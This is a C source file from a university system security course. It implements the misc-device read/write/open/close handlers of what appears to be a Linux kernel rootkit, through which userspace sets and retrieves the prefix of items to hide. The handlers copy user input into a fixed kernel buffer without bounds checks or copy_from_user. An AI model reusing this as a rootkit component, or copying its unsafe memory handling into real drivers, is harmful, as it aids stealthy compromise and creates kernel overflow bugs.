/**********************************************************
	Last Updated: Nov 16, 2014
	CSE509 System Security 2014 Fall @CS SBU
	Written By: 
		Hyungjoon Koo (hykoo@cs.stonybrook.edu)
		Yaohui Chen (yaohchen@cs.stonybrook.edu)

	Description: 
		Misc device operations
		read, write, open, etc
***********************************************************/

#include "../headers/all.h"
#include "../headers/dev.h"

/*
 *
 *
 *extern symbols here
 *
 *
 */

extern void 
getHideStr(char *buf);

static unsigned short count = 0;

ssize_t 
rk_read(struct file *filp, __user char  *buf, size_t len, loff_t offset){

	int i;
	getHideStr(rk_buf);
	printk("nani rk_buf %s\n",rk_buf);
	count = strlen(rk_buf);
	if (len < count)
		return -EINVAL;
	i=0;
	while(len && rk_buf[i]!=0){
		__put_user(rk_buf[i], (buf+i));
		i++;
	//	len--;
	}
	if(is_open){
		is_open = 0;
		return count;
	}
	else{
		return 0;
	}

}

ssize_t 
rk_write(struct file *filp, __user char  *buf, size_t len, loff_t offset){

	memset(rk_buf, 0, BUFLEN);
	count = 0;
	while(len>0){
		rk_buf[count] = buf[count];
		count++;
		len--;
	}
	/*printk("what the fuck %d, msg %s\n",len, rk_buf);*/
	/**(hide_prefix + 0) = kmalloc(strlen(ca)+1,GFP_KERNEL);*/
	/*memcpy(*(hide_prefix+0) ,ca, strlen(ca));*/
	return count;

}

int 
rk_open(struct inode* ino, struct file *filp){
	printk(KERN_INFO "rk opened\n");
	is_open = 1;
	return 0;
}

int 
rk_close(struct inode* ino, struct file *filp){
	is_open = 0;
	printk(KERN_INFO "rk closed\n");
	return 0;
}
